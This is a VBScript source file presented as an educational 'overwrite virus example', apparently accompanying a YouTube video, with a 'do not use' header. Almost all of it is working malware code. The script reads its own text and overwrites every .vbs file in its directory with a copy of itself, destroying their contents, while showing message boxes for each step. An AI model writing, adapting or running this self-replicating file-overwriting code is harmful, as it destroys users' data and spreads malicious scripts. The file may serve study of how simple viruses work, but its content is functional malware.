'
'     VBS OVERWRITE VIRUS EXAMPLE
'     ( infects only in local directory (*.VBS) )
'     FROM VIDEO:
'	  https://www.youtube.com/watch?v=B3ipq6PLW2E
'
'     DO NOT USE THIS CODE !
'
'     0xD3struction
'
'    2o24
Sub Infect(FileName,Virus_Buffer)
	Set Infection = System.CreateTextFile(FileName,true)
	Infection.Write Virus_Buffer
	Infection.Close
End Sub


Set System = CreateObject("Scripting.FileSystemObject")
Dim SelfName 
	SelfName = (Wscript.ScriptFullName)
MsgBox "VIRUS PATH: "&SelfName,vbOKCanacel+vbInformation,"0xD3struction: VBS VIRUS EXAMPLE"		
'---------- SELF READ ----------
Dim Virus_Handle
	Set Virus_Handle = System.OpenTextFile(SelfName,1)
	
Dim Virus_Buffer
	Virus_Buffer = Virus_Handle.ReadAll
	Virus_Handle.Close
	
MsgBox "VIRUS SELF READ: "&vbCrLf&vbCrLf&Virus_Buffer,vbOKCanacel+vbInformation,"0xD3struction:: VBS VIRUS EXAMPLE"
'----------/SELF READ ----------

VPFolder = System.GetParentFolderName(SelfName)
MsgBox "VIRUS FOLDER: "&VPFolder,vbOKCanacel+vbInformation,"0xD3struction:: VBS VIRUS EXAMPLE"
 
Set Virus_Folder = System.GetFolder(VPFolder)
 Set FilesToInfect = Virus_Folder.Files
For Each FileToInfect in FilesToInfect
	if (StrComp(System.GetExtensionName(FileToInfect),"vbs"))=0 then 
	   Call Infect(FileToInfect,Virus_Buffer)
	    MsgBox "[ + ] INFECTED! : "&vbCrLf&FileToInfect,vbOKCanacel+vbInformation,"[ + ]0xD3struction:: VBS VIRUS EXAMPLE "	
	else
	    MsgBox "[ - ] CAN'T INFECT : "&vbCrLf&FileToInfect,vbOKCanacel+vbCritical,"[ - ]0xD3struction:: VBS VIRUS EXAMPLE "	
	end if
Next
MsgBox "  Infected"&vbCrLf&"      By"&vbCrLf&"0xD357ruc710n:",vbOKCanacel+vbCritical,"0xD3struction:: VBS VIRUS EXAMPLE"
